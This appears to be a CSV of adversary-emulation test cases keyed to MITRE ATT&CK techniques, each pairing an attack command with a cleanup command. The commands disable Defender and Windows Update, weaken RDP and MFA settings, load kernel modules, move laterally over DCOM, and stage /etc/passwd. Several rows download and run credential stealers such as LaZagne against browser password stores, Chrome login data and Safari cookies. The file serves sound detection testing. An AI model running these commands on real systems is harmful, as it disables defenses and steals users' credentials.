T1112,Modify Registry,Event Viewer Registry Modification - Redirection Program,81483501-b8a5-4225-8b32-52128e2f69db,"Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f",,,"input_arguments.redirection_program.description: Path of the program to execute upon opening the event help

input_arguments.redirection_program.type: path

input_arguments.redirection_program.default: C:\windows\system32\notepad.exe

"
T1112,Modify Registry,Enabling Remote Desktop Protocol via Remote Registry,e3ad8e83-3089-49ff-817f-e52f8c948090,"Enabling RDP through remote registry.
",windows,,,"reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 2 /f
",,,
T1112,Modify Registry,Disable Win Defender Notification,12e03af7-79f9-4f95-af48-d3f12f28a260,"Disable Win Defender Notification. Redline is using this to disable this win defender feature.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Disable Windows OS Auto Update,01b20ca8-c7a3-4d86-af59-059f15ed5474,"Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Disable Windows Auto Reboot for current logon user,396f997b-c5f8-4a96-bb2c-3c8795cf459d,"Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Windows Auto Update Option to Notify before download,335a6b15-b8d2-4a3f-a973-ad69aa2620d7,"Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 2 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""AUOptions"" /t REG_DWORD /d 3 /f
",,,
T1112,Modify Registry,Do Not Connect To Win Update,d1de3767-99c2-4c6c-8c5a-4ba4586474c8,"Do Not Connect To Win Update. Redline is using this as part of its defense evasion.
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Tamper Win Defender Protection,3b625eaa-c10d-4635-af96-3eae7d2a2f3c,"Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. 
Take note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that 
tries to tamper this Win Defender feature settings.
",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 5 /f
",,,
T1112,Modify Registry,Snake Malware Registry Blob,8318ad20-0488-4a64-98f4-72525a012f6b,"The following Atomic Test creates a registry blob in HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows
registry that is typically found at HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.
",windows,,,"$typicalPath = ""HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds""; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name ""AtomicSnake"" -Value $randomBytes -PropertyType Binary -Force | Out-Null
",powershell,True,,"$typicalPath = ""HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds""; Remove-ItemProperty -Path $typicalPath -Name ""AtomicSnake"" -ErrorAction SilentlyContinue | Out-Null
",,,
T1112,Modify Registry,Allow Simultaneous Download Registry,37950714-e923-4f92-8c7c-51e4b6fffbf6,"A registry modification to allow Simultaneous download in the system.
",windows,,,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f
",command_prompt,True,,"reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /f
reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /f
",,,
T1112,Modify Registry,Modify Internet Zone Protocol Defaults in Current User Registry - cmd,c88ef166-50fa-40d5-a80c-e2b87d4180f7,"This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message ""The operation completed successfully."" will be displayed.
To verify the effects of the test:
1. Open the Registry Editor (regedit.exe).
2. Navigate to ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"".
3. Check for the presence of the ""http"" and ""https"" DWORD values set to `0`.
Or run:
```batch
reg query ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults""
```
",windows,,,"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F
reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F
",command_prompt,,,"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 3 /F
reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 3 /F
",,,
T1112,Modify Registry,Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,b1a4d687-ba52-4057-81ab-757c3dc0d3b5,"This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. 
To verify the effects of the test:
1. Open the Registry Editor (regedit.exe).
2. Navigate to ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"".
3. Check for the presence of the ""http"" and ""https"" DWORD values set to `0`.
Or run:
```powershell
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' | Select-Object http,https
```
",windows,,,"# Set the registry values for http and https to 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0
",powershell,,,"# Restore the registry values for http and https to 3
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 3
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 3
",,,
T1112,Modify Registry,Activities To Disable Secondary Authentication Detected By Modified Registry Value.,c26fb85a-fa50-4fab-a64a-c51f5dc538d5,"Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.
See the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 0 /f
",command_prompt,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 1 /f
",,,
T1112,Modify Registry,Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.,ffeddced-bb9f-49c6-97f0-3d07a509bf94,"Detect the Microsoft FIDO authentication disable activities that adversary attempt to gains access to login credentials (e.g., passwords), they may be able to impersonate the user and access sensitive accounts or data and also increases the risk of falling victim to phishing attacks.
See the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.FidoAuthentication::AllowFidoDeviceSignon).
",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f
",command_prompt,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 1 /f
",,,
T1112,Modify Registry,Scarab Ransomware Defense Evasion Activities,ca8ba39c-3c5a-459f-8e15-280aec65a910,"Scarab Ransomware defense evasion activities that can abuse the registry values to modify the settings of the Credential Security Support Provider to overcome potential RDP connection issues.
[Scarab Ransomware Article](https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/)
",windows,,,"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
",command_prompt,,,"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Disable Remote Desktop Anti-Alias Setting Through Registry,61d35188-f113-4334-8245-8c6556d43909,"A modification registry to disable RDP anti-alias settings. This technique was seen in DarkGate malware as part of its installation
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f
",command_prompt,,,"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Disable Remote Desktop Security Settings Through Registry,4b81bcfa-fb0a-45e9-90c2-e3efe5160140,"A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 1 /f
",command_prompt,,,"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Disabling ShowUI Settings of Windows Error Reporting (WER),09147b61-40f6-4b2a-b6fb-9e73a3437c96,"A modification registry to disable ShowUI settings of Windows Error Report. This registry setting can influence the behavior of error reporting dialogs or prompt box. 
This technique was seen in DarkGate malware as part of its installation.
",windows,,,"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f
",command_prompt,,,"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Enable Proxy Settings,eb0ba433-63e5-4a8c-a9f0-27c4192e1336,"A modification registry to enable proxy settings. This technique was seen in DarkGate malware as part of its installation.
",windows,,,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f
",command_prompt,,,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 0 /f
",,,
T1112,Modify Registry,Set-Up Proxy Server,d88a3d3b-d016-4939-a745-03638aafd21b,"A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.
",windows,,,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.atomic-test.com:8080"" /f
",command_prompt,,,"reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer
",,,
T1112,Modify Registry,RDP Authentication Level Override,7e7b62e9-5f83-477d-8935-48600f38a3c6,"A modification registry to override RDP Authentication Level. This technique was seen in DarkGate malware as part of its installation.
",windows,,,"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f
",command_prompt,,,"reg delete ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride
",,,
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,Linux - Load Kernel Module via insmod,687dcb93-9656-4853-9c36-9977315e9d23,"This test uses the insmod command to load a kernel module for Linux.
",linux,,,"sudo insmod #{module_path}
",bash,True,,"sudo rmmod #{module_name}
[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}
",bash,"dependencies.0.description: The kernel module must exist on disk at specified location

dependencies.0.prereq_command: if [ -f #{module_path} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;
cp #{module_source_path}/* #{temp_folder}/
cd #{temp_folder}; make
if [ ! -f #{module_path} ]; then mv #{temp_folder}/#{module_name}.ko #{module_path}; fi;

","input_arguments.module_name.description: Name of the kernel module name.

input_arguments.module_name.type: string

input_arguments.module_name.default: T1547006

input_arguments.module_path.description: Folder used to store the module.

input_arguments.module_path.type: path

input_arguments.module_path.default: /tmp/T1547.006/T1547006.ko

input_arguments.temp_folder.description: Temp folder used to compile the code.

input_arguments.temp_folder.type: path

input_arguments.temp_folder.default: /tmp/T1547.006

input_arguments.module_source_path.description: Path to download Gsecdump binary file

input_arguments.module_source_path.type: url

input_arguments.module_source_path.default: PathToAtomicsFolder/T1547.006/src

"
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,MacOS - Load Kernel Module via kextload and kmutil,f4391089-d3a5-4dd1-ab22-0419527f2672,"This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.
",macos,,,"set -x
sudo kextload #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload #{module_path}
sudo kmutil load -p #{module_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kmutil unload -p #{module_path}
",bash,True,,,bash,"dependencies.0.description: The kernel module must exist on disk at specified location

dependencies.0.prereq_command: if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi

dependencies.0.get_prereq_command: exit 1

","input_arguments.module_path.description: Folder used to store the module.

input_arguments.module_path.type: path

input_arguments.module_path.default: /Library/Extensions/SoftRAID.kext

"
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,MacOS - Load Kernel Module via KextManagerLoadKextWithURL(),f0007753-beb3-41ea-9948-760785e4c1e5,"This test uses the IOKit API to load a kernel module for macOS.
Harcoded to use SoftRAID kext
",macos,,,"sudo #{exe_path}
kextstat 2>/dev/null | grep SoftRAID
sudo kextunload /Library/Extensions/SoftRAID.kext
",bash,True,,"rm -f #{exe_path}
",bash,"dependencies.0.description: The kernel module must exist on disk at specified location

dependencies.0.prereq_command: if [ -f ""#{exe_path}"" ]; then exit 0 ; else exit 1; fi

dependencies.0.get_prereq_command: cc -o #{exe_path} #{src_path} -framework IOKit -framework Foundation

","input_arguments.src_path.description: Folder used to store the module.

input_arguments.src_path.type: path

input_arguments.src_path.default: PathToAtomicsFolder/T1547.006/src/macos_kextload.c

input_arguments.exe_path.description: Folder used to store the module.

input_arguments.exe_path.type: path

input_arguments.exe_path.default: /tmp/T1547006_iokit_loader

"
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,Snake Malware Kernel Driver Comadmin,e5cb5564-cc7b-4050-86e8-f2d9eec1941f,"The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a
single AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\system32\Com directory. 
This Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.
[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  
",windows,,,"$examplePath = Join-Path $env:windir ""system32\Com""; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = ""comadmin.dat""; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)
",powershell,True,,"$examplePath = Join-Path $env:windir ""system32\Com""; $exampleName = ""comadmin.dat""; $exampleFullPath = Join-Path $examplePath $exampleName; if (Test-Path $exampleFullPath) { Remove-Item $exampleFullPath -Force }
",,,
T1021.003,Remote Services: Distributed Component Object Model,PowerShell Lateral Movement using MMC20,6dc74eb1-c9d6-4c53-b3b5-6f50ae339673,"Powershell lateral movement using the mmc20 application com object.

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

Upon successful execution, cmd will spawn calc.exe on a remote computer.
",windows,,,"[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""#{computer_name}"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")
",powershell,,,,,,"input_arguments.computer_name.description: Name of Computer

input_arguments.computer_name.type: string

input_arguments.computer_name.default: localhost

"
T1021.003,Remote Services: Distributed Component Object Model,PowerShell Lateral Movement Using Excel Application Object,505f24be-1c11-4694-b614-e01ae1cd2570,"Powershell lateral movement using the Excel COM objects.

Reference:

https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922

Upon successful execution, cmd will spawn calc.exe on a remote computer.
",windows,,,"copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""#{computer_name}""))
$com.ActivateMicrosoftApp(""5"")
",powershell,,,"Remove-Item 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
",,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Excel.Application"" | Out-Null
  Stop-Process -Name ""Excel""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

","input_arguments.computer_name.description: Hostname or IP

input_arguments.computer_name.type: string

input_arguments.computer_name.default: localhost

input_arguments.user.description: Name of user

input_arguments.user.type: string

input_arguments.user.default: admin

"
T1543.004,Create or Modify System Process: Launch Daemon,Launch Daemon,03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf,"Utilize LaunchDaemon to launch `Hello World`
",macos,,,"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
",bash,True,,"sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
sudo rm /Library/LaunchDaemons/#{plist_filename}
sudo rm /tmp/T1543_004_atomicredteam.txt
",bash,"dependencies.0.description: The shared library must exist on disk at specified location (#{path_malicious_plist})

dependencies.0.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""The plist file doesn't exist. Check the path and try again.""; exit 1;

","input_arguments.plist_filename.description: filename

input_arguments.plist_filename.type: string

input_arguments.plist_filename.default: com.atomicredteam.plist

input_arguments.path_malicious_plist.description: Name of file to store in cron folder

input_arguments.path_malicious_plist.type: string

input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist

"
T1560.002,Archive Collected Data: Archive via Library,Compressing data using GZip in Python (FreeBSD/Linux),391f5298-b12d-4636-8482-35d9c17d53a8,"Uses GZip from Python to compress files
",linux,,,"which_python=`which python || which python3`
$which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();""
",sh,False,,"rm #{path_to_output_file}
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which python || which python3

dependencies.0.get_prereq_command: echo ""please install python to run this test""; exit 1

","input_arguments.path_to_input_file.description: Path to the file that you want to compress

input_arguments.path_to_input_file.type: path

input_arguments.path_to_input_file.default: /etc/passwd

input_arguments.path_to_output_file.description: Path of the file that you want your .gz file to be

input_arguments.path_to_output_file.type: path

input_arguments.path_to_output_file.default: /tmp/passwd.gz

"
T1560.002,Archive Collected Data: Archive via Library,Compressing data using bz2 in Python (FreeBSD/Linux),c75612b2-9de0-4d7c-879c-10d7b077072d,"Uses bz2 from Python to compress files
",linux,,,"which_python=`which python || which python3`
$which_python -c ""import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();""
",sh,False,,"rm #{path_to_output_file}
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which python || which python3

dependencies.0.get_prereq_command: echo ""please install python to run this test""; exit 1

","input_arguments.path_to_input_file.description: Path to the file that you want to compress

input_arguments.path_to_input_file.type: path

input_arguments.path_to_input_file.default: /etc/passwd

input_arguments.path_to_output_file.description: Path of the file that you want your .bz2 file to be

input_arguments.path_to_output_file.type: path

input_arguments.path_to_output_file.default: /tmp/passwd.bz2

"
T1560.002,Archive Collected Data: Archive via Library,Compressing data using zipfile in Python (FreeBSD/Linux),001a042b-859f-44d9-bf81-fd1c4e2200b0,"Uses zipfile from Python to compress files
",linux,,,"which_python=`which python || which python3`
$which_python -c ""from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')""
",sh,False,,"rm #{path_to_output_file}
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which python || which python3

dependencies.0.get_prereq_command: echo ""please install python to run this test""; exit 1

","input_arguments.path_to_input_file.description: Path to the file that you want to compress

input_arguments.path_to_input_file.type: path

input_arguments.path_to_input_file.default: /etc/passwd

input_arguments.path_to_output_file.description: Path of the file that you want your .zip file to be

input_arguments.path_to_output_file.type: path

input_arguments.path_to_output_file.default: /tmp/passwd.zip

"
T1560.002,Archive Collected Data: Archive via Library,Compressing data using tarfile in Python (FreeBSD/Linux),e86f1b4b-fcc1-4a2a-ae10-b49da01458db,"Uses tarfile from Python to compress files
",linux,,,"which_python=`which python || which python3`
$which_python -c ""from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"" 
",sh,False,,"rm #{path_to_output_file}
",sh,"dependencies.0.description: Requires Python

dependencies.0.prereq_command: which python || which python3

dependencies.0.get_prereq_command: echo ""please install python to run this test""; exit 1

","input_arguments.path_to_input_file.description: Path to the file that you want to compress

input_arguments.path_to_input_file.type: path

input_arguments.path_to_input_file.default: /etc/passwd

input_arguments.path_to_output_file.description: Path of the file that you want your .tar.gz file to be

input_arguments.path_to_output_file.type: path

input_arguments.path_to_output_file.default: /tmp/passwd.tar.gz

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Run Chrome-password Collector,8c05b133-d438-47ca-a630-19cc464c4622,"A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.

Successful execution will produce stdout message stating ""Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly"". Upon completion, final output will be a file modification of PathToAtomicsFolder\..\ExternalPayloads\sysinternals\passwordsdb.

Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
",windows,,,"Set-Location -path ""#{file_path}\Sysinternals"";
./accesschk.exe -accepteula .;
",powershell,,,"Remove-Item ""#{file_path}\Sysinternals"" -Force -Recurse -ErrorAction Ignore
",powershell,"dependencies.0.description: Modified Sysinternals must be located at #{file_path}

dependencies.0.prereq_command: if (Test-Path ""#{file_path}\SysInternals"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest ""https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip"" -OutFile ""#{file_path}\Modified-SysInternalsSuite.zip""
Expand-Archive ""#{file_path}\Modified-SysInternalsSuite.zip"" ""#{file_path}\sysinternals"" -Force
Remove-Item ""#{file_path}\Modified-SysInternalsSuite.zip"" -Force

","input_arguments.file_path.description: File path for modified Sysinternals

input_arguments.file_path.type: string

input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Search macOS Safari Cookies,c1402f7b-67ca-43a8-b5f3-3143abedc01b,"This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.

Upon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.
",macos,,,"cd ~/Library/Cookies
grep -q ""#{search_string}"" ""Cookies.binarycookies""
",sh,,,,,,"input_arguments.search_string.description: String to search Safari cookies to find.

input_arguments.search_string.type: string

input_arguments.search_string.default: coinbase

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,LaZagne - Credentials from Browser,9a2915b3-3954-4cce-8c76-00fbf4dbd014,"The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.
LaZagne is an open source application used to retrieve passwords stored on a local computer. 
",windows,,,"""#{lazagne_path}"" browsers
",command_prompt,True,,,powershell,"dependencies.0.description: LaZagne.exe must exist on disk at specified location (#{lazagne_path})

dependencies.0.prereq_command: if (Test-Path ""#{lazagne_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{lazagne_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"" -OutFile ""#{lazagne_path}""

","input_arguments.lazagne_path.description: Path to LaZagne

input_arguments.lazagne_path.type: path

input_arguments.lazagne_path.default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Simulating access to Chrome Login Data,3d111226-d09a-4911-8715-fe11664f960d,"Simulates an adversary accessing encrypted credentials from Google Chrome Login database. 
",windows,,,"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""
Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""
",powershell,,,"Remove-Item -Path ""PathToAtomicsFolder\..\ExternalPayloads\Login Data"" -Force -ErrorAction Ignore
Remove-Item -Path ""PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account"" -Force -ErrorAction Ignore
